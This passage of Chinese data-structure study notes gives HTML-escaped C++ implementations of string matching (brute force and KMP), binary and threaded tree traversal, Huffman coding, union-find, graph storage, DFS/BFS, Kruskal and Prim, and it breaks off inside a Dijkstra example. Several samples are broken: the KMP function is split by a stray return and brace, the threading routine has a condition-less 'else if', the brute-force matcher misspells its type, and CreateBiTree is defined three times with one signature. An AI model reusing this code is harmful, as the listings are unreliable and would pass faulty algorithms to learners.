&#x3D; 0; i &lt; matrix.size(); i++) &#123; for (int j &#x3D; 0; j &lt; matrix[i].size(); j++) &#123; cout &lt;&lt; matrix[i][j] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; &#125; &#125; 串 #include &lt;iostream&gt; #include &lt;string&gt; #include &lt;vector&gt; using namespace std; #define maxlen 255 &#x2F;&#x2F; 顺序存储 typedef struct&#123; char ch[maxlen]; int length; &#125;SString; &#x2F;&#x2F; 堆分配存储 typedef struct&#123; char *ch; int length; &#125;HString; &#x2F;&#x2F; 链式存储 typedef struct CharNode &#123; char ch; struct CharNode *next; &#125; CharNode, *CharPtr; typedef struct &#123; CharPtr head; int length; &#125; LString; &#x2F;&#x2F; 字串定位算法 &#x2F;&#x2F; Brute-Force int BF(SString s,SSting t,int pos)&#123; int i &#x3D; pos; int j &#x3D; 1; while(i&lt;&#x3D;s.length &amp;&amp; j&lt;&#x3D;t.length())&#123; if(s.ch[i]&#x3D;&#x3D;t.ch[j])&#123; i++; j++; &#125; else&#123; i &#x3D; i - j + 2; j &#x3D; 1; &#125; &#125; if(j&gt;t.length) return i-t.length; else return 0; &#125; &#x2F;&#x2F; KMP vector&lt;int&gt; Next(const string &amp;j) &#123; int m &#x3D; j.length(); vector&lt;int&gt; next(m + 1, 0); int k &#x3D; 0; next[0] &#x3D; -1; for (int i &#x3D; 1; i &lt; m; i++) &#123; while (k &gt;&#x3D; 0 &amp;&amp; j[i] !&#x3D; j[k]) &#123; k &#x3D; next[k]; &#125; k++; next[i + 1] &#x3D; k; &#125; return next; &#125; void KMP(const string &amp;t, const string &amp;j) &#123; int n &#x3D; t.length(); int m &#x3D; j.length(); return; &#125; vector&lt;int&gt; next &#x3D; Next(j); int i &#x3D; 0; int k &#x3D; 0; while (i &lt; n) &#123; if (k &#x3D;&#x3D; -1 || t[i] &#x3D;&#x3D; j[k]) &#123; i++; k++; if (k &#x3D;&#x3D; m) &#123; cout &lt;&lt; t.substr(i - m) &lt;&lt; endl; return; &#125; &#125; else &#123; k &#x3D; next[k]; &#125; return; &#125; STL string 长度：s.size()/s.length() 查找字符（串）第一次出现的位置：s.find(u)/s.find(t,pos) 注：不是 KMP 截取子串：substr(pos,len) 插入：insert(index,str) 替换字符串：replace(first,second,str) #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; int main()&#123; string s &#x3D; &quot;hello, world&quot;; cout &lt;&lt; s.size() &lt;&lt; endl; size_t pos1 &#x3D; s.find(&#39;o&#39;); size_t pos2 &#x3D; s.find(&quot;world&quot;, 0); string sub &#x3D; s.substr(7, 5); string s2 &#x3D; s; s2.insert(5, &quot; C++&quot;); string s3 &#x3D; s; s3.replace(0, 5, &quot;Hi&quot;); &#125; 广义表 typedef enum(ATOM,LIST) ElemTag;&#x2F;&#x2F;ATOM&#x3D;&#x3D;0,原子；LIST&#x3D;&#x3D;1，子表 typedef struct GLNode &#123; ElemTag tag;&#x2F;&#x2F;区分原子结点or表结点 union&#123; AtomType atom;&#x2F;&#x2F;原子值域 struct&#123; struct GNode* hp,*tp; &#125;ptr; &#125;; &#125;*GList; GetHead(LS);&#x2F;&#x2F;取表头 GetTail(LS);&#x2F;&#x2F;取表尾，仍为广义表 树 二叉树 #include &lt;iostream&gt; #include &lt;stack&gt; #include &lt;queue&gt; using namespace std; #define MAXSIZE 100 typedef int TElemType; &#x2F;&#x2F; 顺序存储结构（即层序遍历，空结点值为0） typedef struct&#123; TElemType data[MAXSIZE]; &#125;SqBiTree; &#x2F;&#x2F; 链式定义结点结构 typedef struct BiTNode &#123; TElemType data; BiTNode *lchild, *rchild; &#125; BiTNode, *BiTree; &#x2F;&#x2F; 中序遍历（递归） void InOrderTraverse(BiTree T) &#123; if (T) &#123; InOrderTraverse(T-&gt;lchild); cout &lt;&lt; T-&gt;data; InOrderTraverse(T-&gt;rchild); &#125; &#125; &#x2F;&#x2F; 先序遍历（递归） void PreOrderTraverse(BiTree T) &#123; if (T) &#123; cout &lt;&lt; T-&gt;data; PreOrderTraverse(T-&gt;lchild); PreOrderTraverse(T-&gt;rchild); &#125; &#125; &#x2F;&#x2F; 后序遍历（递归） void PostOrderTraverse(BiTree T) &#123; if (T) &#123; PostOrderTraverse(T-&gt;lchild); PostOrderTraverse(T-&gt;rchild); cout &lt;&lt; T-&gt;data; &#125; &#125; &#x2F;&#x2F; 中序遍历（非递归） void InOrderTraverse_NonRecursive(BiTree T) &#123; stack&lt;BiTree&gt; s; BiTree p &#x3D; T; while (p || !s.empty()) &#123; if (p) &#123; s.push(p); p &#x3D; p-&gt;lchild; &#125; else &#123; BiTree q &#x3D; s.top(); s.pop(); cout &lt;&lt; q-&gt;data; p &#x3D; q-&gt;rchild; &#125; &#125; &#125; &#x2F;&#x2F; 先序遍历（非递归） void PreOrderTraverse_NonRecursive(BiTree T) &#123; if (!T) return; stack&lt;BiTree&gt; s; s.push(T); while (!s.empty()) &#123; BiTree q &#x3D; s.top(); s.pop(); cout &lt;&lt; q-&gt;data; if (q-&gt;rchild) s.push(q-&gt;rchild); &#x2F;&#x2F; 右子树后访问 根据栈先进后出的原则先进 if (q-&gt;lchild) s.push(q-&gt;lchild); &#125; &#125; &#x2F;&#x2F; 后序遍历（非递归） void PostOrderTraverse_NonRecursive(BiTree T) &#123; stack&lt;BiTree&gt; s; BiTree p &#x3D; T; BiTree lastVisited &#x3D; nullptr; while (p || !s.empty()) &#123; if (p) &#123; s.push(p); p &#x3D; p-&gt;lchild; &#125; else &#123; BiTree q &#x3D; s.top(); if (q-&gt;rchild &amp;&amp; lastVisited !&#x3D; q-&gt;rchild) &#123; p &#x3D; q-&gt;rchild; &#125; else &#123; cout &lt;&lt; q-&gt;data; lastVisited &#x3D; q; s.pop(); &#125; &#125; &#125; &#125; &#x2F;&#x2F; 层次遍历二叉树 void LevelOrderTraverse(BiTree T) &#123; if (!T) return; queue&lt;BiTree&gt; q; q.push(T); while (!q.empty()) &#123; BiTree node &#x3D; q.front(); q.pop(); cout &lt;&lt; node-&gt;data &lt;&lt; &#39; &#39;; if (node-&gt;lchild) q.push(node-&gt;lchild); if (node-&gt;rchild) q.push(node-&gt;rchild); &#125; &#125; &#x2F;&#x2F; 根据前序输入创建二叉树，&#39;#&#39;表示空节点 void CreateBiTree(BiTree &amp;T) &#123; char ch; cin &gt;&gt; ch; if (ch &#x3D;&#x3D; &#39;#&#39;) &#123; T &#x3D; nullptr; &#125; else &#123; T &#x3D; new BiTNode; T-&gt;data &#x3D; ch; CreateBiTree(T-&gt;lchild); CreateBiTree(T-&gt;rchild); &#125; &#125; &#x2F;&#x2F; 根据中序输入创建二叉树，&#39;#&#39;表示空节点 void CreateBiTree(BiTree &amp;T) &#123; char ch; cin &gt;&gt; ch; if (ch &#x3D;&#x3D; &#39;#&#39;) &#123; T &#x3D; nullptr; &#125; else &#123; CreateBiTree(T-&gt;lchild); T &#x3D; new BiTNode; T-&gt;data &#x3D; ch; CreateBiTree(T-&gt;rchild); &#125; &#125; &#x2F;&#x2F; 根据后序输入创建二叉树，&#39;#&#39;表示空节点 void CreateBiTree(BiTree &amp;T) &#123; char ch; cin &gt;&gt; ch; if (ch &#x3D;&#x3D; &#39;#&#39;) &#123; T &#x3D; nullptr; &#125; else &#123; CreateBiTree(T-&gt;lchild); CreateBiTree(T-&gt;rchild); T &#x3D; new BiTNode; T-&gt;data &#x3D; ch; &#125; &#125; &#x2F;&#x2F; 计算二叉树的高度 int Depth(BiTree T) &#123; if (!T) return 0; int m &#x3D; Depth(T-&gt;lchild); int n &#x3D; Depth(T-&gt;rchild); return (m &gt; n ? m + 1 : n + 1); &#125; &#x2F;&#x2F; 统计二叉树的节点个数 int NodeCount(BiTree T) &#123; if (!T) return 0; return NodeCount(T-&gt;lchild) + NodeCount(T-&gt;rchild) + 1; &#125; &#x2F;&#x2F; 线索二叉树的结点结构 typedef struct BiThrNode &#123; TElemType data; BiThrNode *lchild, *rchild; int LTag, RTag; &#x2F;&#x2F; 0 表示指针，1 表示线索 &#125; BiThrNode, *BiThrTree; &#x2F;&#x2F; 全局变量，用于中序线索化过程中的前驱节点 BiThrNode *pre &#x3D; nullptr; &#x2F;&#x2F; 中序线索化（递归） void InThreading(BiThrTree p) &#123; if (p) &#123; InThreading(p-&gt;lchild); if (!p-&gt;lchild) &#123; p-&gt;LTag &#x3D; 1; p-&gt;lchild &#x3D; pre; &#125; else &#123; p-&gt;LTag &#x3D; 0; &#125; if (pre &amp;&amp; !pre-&gt;rchild) &#123; pre-&gt;RTag &#x3D; 1; pre-&gt;rchild &#x3D; p; &#125; else if &#123; pre-&gt;RTag &#x3D; 0; &#125; pre &#x3D; p; InThreading(p-&gt;rchild); &#125; &#125; &#x2F;&#x2F; 构建中序线索二叉树（带头结点） void CreateInOrderThread(BiThrTree &amp;T) &#123; BiThrTree head &#x3D; new BiThrNode; head-&gt;LTag &#x3D; 0; head-&gt;RTag &#x3D; 1; head-&gt;rchild &#x3D; head; pre &#x3D; head; head-&gt;lchild &#x3D; T; InThreading(T); pre-&gt;rchild &#x3D; head; pre-&gt;RTag &#x3D; 1; T &#x3D; head; &#125; &#x2F;&#x2F; 遍历中序线索二叉树（非递归） void InOrderTraverse_Thr(BiThrTree T) &#123; BiThrTree p &#x3D; T-&gt;lchild; while (p !&#x3D; T) &#123; while (p-&gt;LTag &#x3D;&#x3D; 0) p &#x3D; p-&gt;lchild; cout &lt;&lt; p-&gt;data; while (p-&gt;RTag &#x3D;&#x3D; 1 &amp;&amp; p-&gt;rchild !&#x3D; T) &#123; p &#x3D; p-&gt;rchild; cout &lt;&lt; p-&gt;data; &#125; p &#x3D; p-&gt;rchild; &#125; &#125; 树与森林 #define MAXSIZE 100 &#x2F;&#x2F; 双亲表示法 typedef struct&#123; char data; int parent; &#125;PTNode; typedef struct&#123; PTNode nodes[MAXSIZE]; int n; &#125;PTree; &#x2F;&#x2F; 孩子表示法 typedef struct CSNode&#123; char data; struct CSNode* firstchild,*nextsibling; &#125;CSNode,*CSTree; 哈夫曼树 #include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;queue&gt; #include &lt;vector&gt; using namespace std; typedef struct &#123; int weight; int parent, lchild, rchild; &#125; HTNode, *HuffmanTree; typedef char **HuffmanCode; void CreateHuffmanTree(HuffmanTree &amp;T, int n) &#123; if (n &lt;&#x3D; 1) return; int m &#x3D; 2 * n - 1; T &#x3D; new HTNode[m + 1]; &#x2F;&#x2F; 初始化所有节点 for (int i &#x3D; 1; i &lt;&#x3D; m; i++) &#123; T[i].parent &#x3D; 0; T[i].lchild &#x3D; 0; T[i].rchild &#x3D; 0; T[i].weight &#x3D; 0; &#125; &#x2F;&#x2F; 输入叶子节点权重 for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; cin &gt;&gt; T[i].weight; &#125; &#x2F;&#x2F; 使用优先队列存储 priority_queue&lt;pair&lt;int, int&gt;, vector&lt;pair&lt;int, int&gt;&gt;, greater&lt;pair&lt;int, int&gt;&gt;&gt; pq; for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; pq.push(make_pair(T[i].weight, i)); &#125; int current &#x3D; n + 1; &#x2F;&#x2F; 当前中间节点索引 for (int i &#x3D; 1; i &lt;&#x3D; n - 1; i++) &#123; &#x2F;&#x2F; 获取两个最小节点 int s1 &#x3D; -1, s2 &#x3D; -1; &#x2F;&#x2F; 寻找第一个有效节点 while (!pq.empty() &amp;&amp; s1 &#x3D;&#x3D; -1) &#123; auto top &#x3D; pq.top(); pq.pop(); if (T[top.second].parent &#x3D;&#x3D; 0) &#123; s1 &#x3D; top.second; &#125; &#125; &#x2F;&#x2F; 寻找第二个有效节点 while (!pq.empty() &amp;&amp; s2 &#x3D;&#x3D; -1) &#123; auto top &#x3D; pq.top(); pq.pop(); if (T[top.second].parent &#x3D;&#x3D; 0) &#123; s2 &#x3D; top.second; &#125; &#125; if (s1 &#x3D;&#x3D; -1 || s2 &#x3D;&#x3D; -1) &#123; return; &#125; &#x2F;&#x2F; 创建新节点 T[current].weight &#x3D; T[s1].weight + T[s2].weight; T[current].lchild &#x3D; s1; T[current].rchild &#x3D; s2; T[s1].parent &#x3D; current; T[s2].parent &#x3D; current; &#x2F;&#x2F; 将新节点加入优先队列 pq.push(make_pair(T[current].weight, current)); current++; &#125; &#125; void CreateHuffmanCode(HuffmanTree HT, HuffmanCode &amp;HC, int n) &#123; HC &#x3D; new char *[n + 1]; char *cd &#x3D; new char[n]; cd[n - 1] &#x3D; &#39;\\0&#39;; for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; int start &#x3D; n - 1; int c &#x3D; i; int f &#x3D; HT[i].parent; while (f !&#x3D; 0) &#123; start--; if (HT[f].lchild &#x3D;&#x3D; c) &#123; cd[start] &#x3D; &#39;0&#39;; &#125; else &#123; cd[start] &#x3D; &#39;1&#39;; &#125; c &#x3D; f; f &#x3D; HT[f].parent; &#125; HC[i] &#x3D; new char[n - start]; strcpy(HC[i], &amp;cd[start]); &#125; delete[] cd; &#125; 并查集 const int MAXN &#x3D; 1000; int father[MAXN]; int Rank[MAXN]; void init() &#123; for (int i &#x3D; 0; i &lt; MAXN; i++) &#123; father[i] &#x3D; i; Rank[i] &#x3D; 1; &#125; &#125; int find_set(int x) &#123; if (x !&#x3D; father[x]) &#123; father[x] &#x3D; find_set(father[x]); &#125; return father[x]; &#125; void Union(int x, int y) &#123; int root_x &#x3D; find_set(x); int root_y &#x3D; find_set(y); if (root_x &#x3D;&#x3D; root_y) return; if (Rank[root_x] &gt; Rank[root_y]) &#123; father[root_y] &#x3D; root_x; Rank[root_x] +&#x3D; Rank[root_y]; &#125; else &#123; father[root_x] &#x3D; root_y; Rank[root_y] +&#x3D; Rank[root_x]; &#125; &#125; 图 邻接矩阵 #include &lt;bits&#x2F;stdc++.h&gt; using namespace std; #define MaxInt 32767 &#x2F;&#x2F; 极大值 #define MVNum 100 &#x2F;&#x2F; 顶点最大值 typedef char VerTexType; &#x2F;&#x2F; 顶点类型定义 typedef int ArcType; &#x2F;&#x2F; 边类型定义 &#x2F;&#x2F; 邻接矩阵表示法 typedef struct &#123; VerTexType vexs[MVNum]; &#x2F;&#x2F; 顶点表 ArcType arcs[MVNum][MVNum]; &#x2F;&#x2F; 邻接矩阵 int vexnum, arcnum; &#x2F;&#x2F; 顶点数目 边数目 &#125; AMGraph; &#x2F;&#x2F; 为AMGraph定位顶点 int LocateVex(AMGraph G, VerTexType v) &#123; for (int i &#x3D; 0; i &lt; G.vexnum; i++) &#123; if (G.vexs[i] &#x3D;&#x3D; v) &#123; return i; &#125; &#125; return -1; &#125; &#x2F;&#x2F; 初始化邻接矩阵 void CreateAM(AMGraph &amp;G) &#123; cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum; for (int i &#x3D; 0; i &lt; G.vexnum; i++) &#123; cin &gt;&gt; G.vexs[i]; &#125; for (int i &#x3D; 0; i &lt; G.vexnum; i++) &#123; for (int j &#x3D; 0; j &lt; G.vexnum; j++) &#123; if (i &#x3D;&#x3D; j) &#123; G.arcs[i][j] &#x3D; 0; &#125; else &#123; G.arcs[i][j] &#x3D; MaxInt; &#125; &#125; &#125; for (int k &#x3D; 0; k &lt; G.arcnum; k++) &#123; VerTexType v1, v2; ArcType w; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; int i &#x3D; LocateVex(G, v1); int j &#x3D; LocateVex(G, v2); G.arcs[i][j] &#x3D; w; G.arcs[j][i] &#x3D; w; &#125; &#125; 邻接表 #include&lt;bits&#x2F;stdc++.h&gt; using namespace std; &#x2F;&#x2F; 邻接表表示法 typedef struct ArcNode &#123; int adjvex; &#x2F;&#x2F; 该边指向的顶点位置 int weight; &#x2F;&#x2F; 边的权重 struct ArcNode *nextarc; &#125; ArcNode; typedef struct VNode &#123; VerTexType data; &#x2F;&#x2F; 顶点信息 ArcNode *firstarc; &#x2F;&#x2F; 指向第一条边的指针 &#125; VNode, AdjList[MVNum]; typedef struct &#123; AdjList vertices; &#x2F;&#x2F; 邻接表 int vexnum, arcnum; &#x2F;&#x2F; 顶点数和边数 &#125; ALGraph; &#x2F;&#x2F; 为 ALGraph 定位顶点 int LocateVex(const ALGraph &amp;G, VerTexType v) &#123; for (int i &#x3D; 0; i &lt; G.vexnum; i++) &#123; if (G.vertices[i].data &#x3D;&#x3D; v) &#123; return i; &#125; &#125; return -1; &#125; &#x2F;&#x2F; 初始化邻接表 void CreateAL(ALGraph &amp;G) &#123; cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum; for (int i &#x3D; 0; i &lt; G.vexnum; i++) &#123; cin &gt;&gt; G.vertices[i].data; G.vertices[i].firstarc &#x3D; NULL; &#125; for (int k &#x3D; 0; k &lt; G.arcnum; k++) &#123; VerTexType v1, v2; ArcType weight; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; weight; int i &#x3D; LocateVex(G, v1); int j &#x3D; LocateVex(G, v2); &#x2F;&#x2F; 添加边 v1 -&gt; v2 头插法 ArcNode *p1 &#x3D; new ArcNode; p1-&gt;adjvex &#x3D; j; p1-&gt;weight &#x3D; weight; p1-&gt;nextarc &#x3D; G.vertices[i].firstarc; G.vertices[i].firstarc &#x3D; p1; &#x2F;* 添加边 v2 -&gt; v1（无向图必须对称） ArcNode *p2 &#x3D; new ArcNode; p2-&gt;adjvex &#x3D; i; p2-&gt;weight &#x3D; weight; p2-&gt;nextarc &#x3D; G.vertices[j].firstarc; G.vertices[j].firstarc &#x3D; p2; *&#x2F; &#125; &#125; 十字链表 &#x2F;&#x2F; 十字链表表示法（有向图） typedef struct ArcNode_OL &#123; int tailvex; &#x2F;&#x2F; 弧尾顶点位置 int headvex; &#x2F;&#x2F; 弧头顶点位置 struct ArcNode_OL *hlink; &#x2F;&#x2F; 指向同一弧头的下一条弧 struct ArcNode_OL *tlink; &#x2F;&#x2F; 指向同一弧尾的下一条弧 int weight; &#x2F;&#x2F; 弧的权值 InfoType info; &#x2F;&#x2F; 其他信息 &#125; ArcNode_OL; typedef struct VexNode_OL &#123; VerTexType data; &#x2F;&#x2F; 顶点数据 ArcNode_OL *firstin; &#x2F;&#x2F; 指向以该顶点为弧头的第一条弧 ArcNode_OL *firstout; &#x2F;&#x2F; 指向以该顶点为弧尾的第一条弧 &#125; VexNode_OL; typedef struct &#123; VexNode_OL xlist[MVNum]; &#x2F;&#x2F; 顶点表 int vexnum, arcnum; &#x2F;&#x2F; 顶点数和弧数 &#125; OLGraph; 邻接多重表 &#x2F;&#x2F; 邻接多重表表示法（无向图） typedef struct EBox &#123; int ivex, jvex; &#x2F;&#x2F; 该边依附的两个顶点位置 struct EBox *ilink; &#x2F;&#x2F; 指向依附于顶点ivex的下一条边 struct EBox *jlink; &#x2F;&#x2F; 指向依附于顶点jvex的下一条边 int weight; &#x2F;&#x2F; 边的权值 bool mark; &#x2F;&#x2F; 访问标记 InfoType info; &#x2F;&#x2F; 其他信息 &#125; EBox; typedef struct VexBox &#123; VerTexType data; &#x2F;&#x2F; 顶点数据 EBox *firstedge; &#x2F;&#x2F; 指向第一条依附于该顶点的边 &#125; VexBox; typedef struct &#123; VexBox adjmulist[MVNum]; &#x2F;&#x2F; 顶点表 int vexnum, edgenum; &#x2F;&#x2F; 顶点数和边数 &#125; AMLGraph; DFS #include &lt;iostream&gt; #include &lt;vector&gt; using namespace std; const int MVNum &#x3D; 100; bool visited[MVNum]; vector&lt;int&gt; path; struct AMGraph &#123; int arcs[MVNum][MVNum]; int vexnum, arcnum; &#125;; struct ArcNode &#123; int adjvex; ArcNode *nextarc; &#125;; struct VNode &#123; ArcNode *firstarc; &#125;; struct ALGraph &#123; VNode vertices[MVNum]; int vexnum, arcnum; &#125;; void DFS_AM(AMGraph G, int v) &#123; cout &lt;&lt; v &lt;&lt; &quot; &quot;; visited[v] &#x3D; true; path.push_back(v); for (int w &#x3D; 0; w &lt; G.vexnum; w++) if (G.arcs[v][w] &amp;&amp; !visited[w]) DFS_AM(G, w); &#125; void DFS_AL(ALGraph G, int v) &#123; cout &lt;&lt; v &lt;&lt; &quot; &quot;; visited[v] &#x3D; true; path.push_back(v); ArcNode *p &#x3D; G.vertices[v].firstarc; while (p) &#123; int w &#x3D; p-&gt;adjvex; if (!visited[w]) DFS_AL(G, w); p &#x3D; p-&gt;nextarc; &#125; &#125; void DFSTraverse_AM(AMGraph G) &#123; path.clear(); for (int i &#x3D; 0; i &lt; G.vexnum; ++i) visited[i] &#x3D; false; for (int i &#x3D; 0; i &lt; G.vexnum; ++i) if (!visited[i]) DFS_AM(G, i); &#125; void DFSTraverse_AL(ALGraph G) &#123; path.clear(); for (int i &#x3D; 0; i &lt; G.vexnum; ++i) visited[i] &#x3D; false; for (int i &#x3D; 0; i &lt; G.vexnum; ++i) if (!visited[i]) DFS_AL(G, i); &#125; void PrintPath() &#123; for (size_t i &#x3D; 0; i &lt; path.size(); ++i) &#123; cout &lt;&lt; path[i]; if (i &lt; path.size() - 1) cout &lt;&lt; &quot; -&gt; &quot;; &#125; cout &lt;&lt; endl; &#125; BFS #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;queue&gt; using namespace std; const int MVNum &#x3D; 100; bool visited[MVNum]; vector&lt;int&gt; path; struct AMGraph &#123; int arcs[MVNum][MVNum]; int vexnum, arcnum; &#125;; struct ArcNode &#123; int adjvex; ArcNode *nextarc; &#125;; struct VNode &#123; ArcNode *firstarc; &#125;; struct ALGraph &#123; VNode vertices[MVNum]; int vexnum, arcnum; &#125;; void BFS_AM(AMGraph G, int v) &#123; queue&lt;int&gt; Q; cout &lt;&lt; v &lt;&lt; &quot; &quot;; visited[v] &#x3D; true; path.push_back(v); Q.push(v); while (!Q.empty()) &#123; int u &#x3D; Q.front(); Q.pop(); for (int w &#x3D; 0; w &lt; G.vexnum; w++) &#123; if (G.arcs[u][w] &amp;&amp; !visited[w]) &#123; cout &lt;&lt; w &lt;&lt; &quot; &quot;; visited[w] &#x3D; true; path.push_back(w); Q.push(w); &#125; &#125; &#125; &#125; void BFS_AL(ALGraph G, int v) &#123; queue&lt;int&gt; Q; cout &lt;&lt; v &lt;&lt; &quot; &quot;; visited[v] &#x3D; true; path.push_back(v); Q.push(v); while (!Q.empty()) &#123; int u &#x3D; Q.front(); Q.pop(); ArcNode *p &#x3D; G.vertices[u].firstarc; while (p) &#123; int w &#x3D; p-&gt;adjvex; if (!visited[w]) &#123; cout &lt;&lt; w &lt;&lt; &quot; &quot;; visited[w] &#x3D; true; path.push_back(w); Q.push(w); &#125; p &#x3D; p-&gt;nextarc; &#125; &#125; &#125; void BFSTraverse_AM(AMGraph G) &#123; path.clear(); for (int i &#x3D; 0; i &lt; G.vexnum; ++i) visited[i] &#x3D; false; for (int i &#x3D; 0; i &lt; G.vexnum; ++i) if (!visited[i]) BFS_AM(G, i); &#125; void BFSTraverse_AL(ALGraph G) &#123; path.clear(); for (int i &#x3D; 0; i &lt; G.vexnum; ++i) visited[i] &#x3D; false; for (int i &#x3D; 0; i &lt; G.vexnum; ++i) if (!visited[i]) BFS_AL(G, i); &#125; void PrintPath() &#123; for (size_t i &#x3D; 0; i &lt; path.size(); ++i) &#123; cout &lt;&lt; path[i]; if (i &lt; path.size() - 1) cout &lt;&lt; &quot; -&gt; &quot;; &#125; cout &lt;&lt; endl; &#125; 最小生成树（MST） Kruskal #include&lt;bits&#x2F;stdc++.h&gt; using namespace std; #define MAXVEX 100 #define INF 114514 typedef struct &#123; int adjvex; int weight; struct ArcNode *next; &#125; ArcNode; typedef struct &#123; ArcNode *firstarc; &#125; AdjList[MAXVEX]; typedef struct &#123; AdjList vertices; int vexnum, arcnum; &#125; Graph; bool hasCycle(Graph &amp;G, int from, int to, vector&lt;bool&gt;&amp; visited, int parent) &#123; visited[from] &#x3D; true; ArcNode* p &#x3D; G.vertices[from].firstarc; while(p) &#123; int next &#x3D; p-&gt;adjvex; if(!visited[next]) &#123; if(hasCycle(G, next, to, visited, from)) &#123; return true; &#125; &#125; else if( next !&#x3D; parent &amp;&amp; next &#x3D;&#x3D; to) &#123; return true; &#125; p &#x3D; p-&gt;next; &#125; return false; &#125; bool isSafe(Graph &amp;G, int from, int to) &#123; vector&lt;bool&gt; visited(G.vexnum + 1, false); return !hasCycle(G, from, to, visited, -1); &#125; void CreateGraph(Graph &amp;G) &#123; cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum; for(int i&#x3D;1; i&lt;&#x3D;G.vexnum; i++) &#123; G.vertices[i].firstarc &#x3D; nullptr; &#125; for(int i&#x3D;1; i&lt;&#x3D;G.arcnum; i++) &#123; int m,n,w; cin &gt;&gt; m &gt;&gt; n &gt;&gt; w; ArcNode *p1 &#x3D; new ArcNode; p1-&gt;adjvex &#x3D; n; p1-&gt;weight &#x3D; w; p1-&gt;next &#x3D; G.vertices[m].firstarc; G.vertices[m].firstarc &#x3D; p1; ArcNode *p2 &#x3D; new ArcNode; p2-&gt;adjvex &#x3D; m; p2-&gt;weight &#x3D; w; p2-&gt;next &#x3D; G.vertices[n].firstarc; G.vertices[n].firstarc &#x3D; p2; &#125; &#125; void PrintMST(vector&lt;vector&lt;int&gt;&gt; &amp;mst, int n) &#123; for(int i&#x3D;1; i&lt;&#x3D;n; i++) &#123; for(int j&#x3D;i+1; j&lt;&#x3D;n; j++) &#123; if(mst[i][j] !&#x3D; 0) &#123; cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; j &lt;&lt; endl; &#125; &#125; &#125; &#125; int main() &#123; Graph G; CreateGraph(G); vector&lt;vector&lt;int&gt;&gt; mst(G.vexnum+1, vector&lt;int&gt;(G.vexnum+1, 0)); int MSTedge &#x3D; 0; while(MSTedge &lt; G.vexnum-1) &#123; int min &#x3D; INF; int p1 &#x3D; -1, p2 &#x3D; -1; for(int i&#x3D;1; i&lt;&#x3D;G.vexnum; i++) &#123; ArcNode *p &#x3D; G.vertices[i].firstarc; while(p) &#123; if(p-&gt;weight &lt; min &amp;&amp; !mst[i][p-&gt;adjvex] &amp;&amp; isSafe(G, i, p-&gt;adjvex)) &#123; min &#x3D; p-&gt;weight; p1 &#x3D; i; p2 &#x3D; p-&gt;adjvex; &#125; p &#x3D; p-&gt;next; &#125; &#125; if(p1 &#x3D;&#x3D; -1) &#123; cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl; return 1; &#125; mst[p1][p2] &#x3D; 1; mst[p2][p1] &#x3D; 1; MSTedge++; &#125; PrintMST(mst, G.vexnum); return 0; &#125; Prim #include&lt;bits&#x2F;stdc++.h&gt; using namespace std; #define INF 32366 #define MAX_VERTICES 100 typedef struct &#123; int edges[MAX_VERTICES][MAX_VERTICES]; int edgeCount; int vertexCount; &#125; Graph; void printMST(vector&lt;vector&lt;int&gt;&gt;&amp; mst, int n) &#123; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; for(int j &#x3D; i + 1; j &lt;&#x3D; n; j++) &#123; if(mst[i][j] &#x3D;&#x3D; 1) &#123; cout &lt;&lt; i &lt;&lt; &quot; - &quot; &lt;&lt; j &lt;&lt; endl; &#125; &#125; &#125; &#125; int main() &#123; int n; cin &gt;&gt; n; Graph g; g.edgeCount &#x3D; n - 1; g.vertexCount &#x3D; n; for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; g.edges[i][j] &#x3D; INF; &#125; &#125; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; int from, to, weight; cin &gt;&gt; from &gt;&gt; to &gt;&gt; weight; g.edges[from][to] &#x3D; weight; g.edges[to][from] &#x3D; weight; &#125; vector&lt;bool&gt; visited(n + 1, false); vector&lt;vector&lt;int&gt;&gt; mst(n + 1, vector&lt;int&gt;(n + 1, 0)); visited[1] &#x3D; true; int mstEdgeCount &#x3D; 0; while(mstEdgeCount &lt; n - 1) &#123; int minWeight &#x3D; INF; int minFrom &#x3D; -1; int minTo &#x3D; -1; for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; if(visited[i]) &#123; for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; if(!visited[j] &amp;&amp; g.edges[i][j] &lt; minWeight) &#123; minWeight &#x3D; g.edges[i][j]; minFrom &#x3D; i; minTo &#x3D; j; &#125; &#125; &#125; &#125; if(minFrom &#x3D;&#x3D; -1) &#123; cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl; return 1; &#125; mst[minFrom][minTo] &#x3D; 1; mst[minTo][minFrom] &#x3D; 1; visited[minTo] &#x3D; true; mstEdgeCount++; &#125; printMST(mst, n); return 0; &#125; 最短路径 Dijkstra #include &lt;bits&#x2F;stdc++.h&gt; using namespace std; #define MVNum 100 #define INF 114154 typedef struct &#123; char vexs[MVNum]; int arcs[MVNum][MVNum]; int vexNum, arcNum; &#125; Graph; int LocateVex(const Graph &amp;G, char v) &#123; for (int i &#x3D; 0; i &lt; G.vexNum; ++i) &#123; if (G.vexs[i] &#x3D;&#x3D; v) return i; &#125; return -1; &#125; void Create(Graph &amp;G) &#123; cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum; for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++) &#123; cin &gt;&gt; G.vexs[i]; &#125; for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++) &#123; for(int j&#x3D;1;j&lt;&#x3D;G.vexNum;j++) &#123; G.arcs[i][j]&#x3D;INF; if(i&#x3D;&#x3D;j) &#123; G.arcs[i][j]&#x3D;0; &#125; &#125; &#125; for (int k &#x3D; 1; k &lt;&#x3D; G.arcNum; k++) &#123; char v1, v2; int w; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; int i &#x3D; 